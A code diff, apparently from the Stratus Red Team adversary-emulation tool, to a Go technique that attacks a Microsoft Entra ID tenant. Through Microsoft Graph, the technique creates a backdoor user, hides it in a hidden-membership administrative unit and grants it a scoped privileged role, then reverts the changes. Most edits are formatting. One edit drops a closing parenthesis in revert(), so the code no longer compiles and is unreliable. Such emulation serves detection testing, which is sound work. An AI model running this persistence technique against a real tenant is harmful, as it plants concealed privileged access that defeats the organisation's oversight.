@@ -5,10 +5,10 @@ import (
 	_ "embed"
 	"errors"
 	"fmt"
-	graph "github.com/microsoftgraph/msgraph-sdk-go"
-	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
+	graph "github.com/microsoftgraph/msgraph-sdk-go"
+	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
 	"log"
 	"strings"
 )
@@ -80,18 +80,18 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	// 0. Create Backdoor User
 	requestBodyUser := graphmodels.NewUser()
 	accountEnabled := true
-	requestBodyUser.SetAccountEnabled(&accountEnabled) 
+	requestBodyUser.SetAccountEnabled(&accountEnabled)
 	displayName := fmt.Sprintf("Stratus Backdoor User - %s", suffix)
-	requestBodyUser.SetDisplayName(&displayName) 
+	requestBodyUser.SetDisplayName(&displayName)
 	mailNickname := "StratusB"
-	requestBodyUser.SetMailNickname(&mailNickname) 
+	requestBodyUser.SetMailNickname(&mailNickname)
 	userPrincipalName := fmt.Sprintf("stratus-red-team-hidden-au-backdoor-%s@%s", suffix, domain)
-	requestBodyUser.SetUserPrincipalName(&userPrincipalName) 
+	requestBodyUser.SetUserPrincipalName(&userPrincipalName)
 	passwordProfile := graphmodels.NewPasswordProfile()
 	forceChangePasswordNextSignIn := true
-	passwordProfile.SetForceChangePasswordNextSignIn(&forceChangePasswordNextSignIn) 
+	passwordProfile.SetForceChangePasswordNextSignIn(&forceChangePasswordNextSignIn)
 	// Using password from Terraform
-	passwordProfile.SetPassword(&password) 
+	passwordProfile.SetPassword(&password)
 	requestBodyUser.SetPasswordProfile(passwordProfile)
 
 	userResult, err := graphClient.Users().Post(context.Background(), requestBodyUser, nil)
@@ -108,11 +108,11 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	// 1. Create Hidden AU
 	requestBodyAU := graphmodels.NewAdministrativeUnit()
 	displayNameAU := fmt.Sprintf("Stratus Hidden AU - %s", suffix)
-	requestBodyAU.SetDisplayName(&displayNameAU) 
+	requestBodyAU.SetDisplayName(&displayNameAU)
 	description := "Hidden AU created from Stratus"
-	requestBodyAU.SetDescription(&description) 
+	requestBodyAU.SetDescription(&description)
 	visibility := "HiddenMembership"
-	requestBodyAU.SetVisibility(&visibility) 
+	requestBodyAU.SetVisibility(&visibility)
 
 	auResult, err := graphClient.Directory().AdministrativeUnits().Post(context.Background(), requestBodyAU, nil)
 
@@ -142,7 +142,7 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	requestBodyRole.SetPrincipalId(&backdoorUserId)
 	directoryScopeId := ("/administrativeUnits/" + auId)
 	requestBodyRole.SetDirectoryScopeId(&directoryScopeId)
-	
+
 	_, err = graphClient.RoleManagement().Directory().RoleAssignments().Post(context.Background(), requestBodyRole, nil)
 
 	if err != nil {
@@ -150,7 +150,7 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	}
 
 	log.Println("Assigned PAA scoped role to backdoor user " + backdoorPrincipalName)
-	
+
 	return nil
 }
 
@@ -171,13 +171,13 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 	}
 
 	var auId string
-    for _, au := range auResult.GetValue() {
-        auName := *au.GetDisplayName()
-		if strings.HasSuffix(auName, suffix){
+	for _, au := range auResult.GetValue() {
+		auName := *au.GetDisplayName()
+		if strings.HasSuffix(auName, suffix) {
 			auId = *au.GetId()
 			break
 		}
-    }
+	}
 
 	// 2. Delete Hidden AU
 	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Delete(context.Background(), nil)
@@ -187,16 +187,20 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 
 	// 3. Get backdoor user ID
 	userResult, err := graphClient.Users().Get(context.Background(), nil)
+	if err != nil {
+		return errors.New("could not retrieve users: " + err.Error())
+	}
+	
 	var userId string
-    for _, user := range userResult.GetValue() {
-        userName := *user.GetDisplayName()
-		if strings.HasSuffix(userName, suffix){
+	for _, user := range userResult.GetValue() {
+		userName := *user.GetDisplayName()
+		if strings.HasSuffix(userName, suffix) {
 			userId = *user.GetId()
 			break
 		}
     }
 	if err != nil {
-		return errors.New("could not fetch backdoor user: " + err.Error())
+		return errors.New("could not fetch backdoor user: " + err.Error()
 	}
 
 	// 4. Delete backdoor user
